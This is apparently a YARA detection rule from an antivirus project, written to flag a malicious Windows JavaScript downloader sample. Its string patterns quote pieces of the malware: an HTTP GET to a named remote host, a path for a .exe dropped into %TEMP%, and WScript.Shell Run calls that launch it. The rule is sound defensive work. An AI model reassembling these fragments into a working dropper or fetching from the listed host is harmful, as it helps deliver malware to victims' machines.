rule sig_20160329_c4a48f62be7670ca2799dc27ffb0caaf {
  meta:
    description = "datamaliciousorder - file 20160329_c4a48f62be7670ca2799dc27ffb0caaf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d01c0e9e7126f500e6821cc4e241bdd85fa5d79e125cbc5ad29789a00be08052"

  strings:
    $s1  = "En[E](\"GET\", \"http://lojaagrometal.com.br/mi3sa\", false);" fullword ascii
    $s2  = "function DB() {return JQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dBooZ2WJjd16so.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[q](bO() * 11); if (En[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var JQ = function FZ() {return WScript[DW](\"WScript.Shell\");}(), M = 11;" fullword ascii
    $s5  = "function K(pa, s){K0 = K0 * 1; return pa - s;};" fullword ascii
    $s6  = "function j(){return \"\" + gE;};" fullword ascii
    $s7  = "function R(K1){JQ[\"Run\"](K1, K0, K0);};" fullword ascii
    $s8  = "function Z() {return ((Da == true) && (Da == R0)) ? 1 : K0;};" fullword ascii
    $s9  = "function kq(rh) {var l = (1, 2, 3, 4, 5, rh); return l;};" fullword ascii
    $s10 = "return K(g, i);" fullword ascii
    $s11 = "function aT(){return DW;};" fullword ascii
    $s12 = "var Kd = new this[\"Date\"]();" fullword ascii
    $s13 = "function bO(){return 22;};" fullword ascii
    $s14 = "function YS()" fullword ascii
    $s15 = " while (XK){" fullword ascii
    $s16 = "R0 = true; " fullword ascii
    $s17 = "var R0 = false;" fullword ascii
    $s18 = "var I = false;" fullword ascii
    $s19 = "var Da = false;" fullword ascii
    $s20 = "Da = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}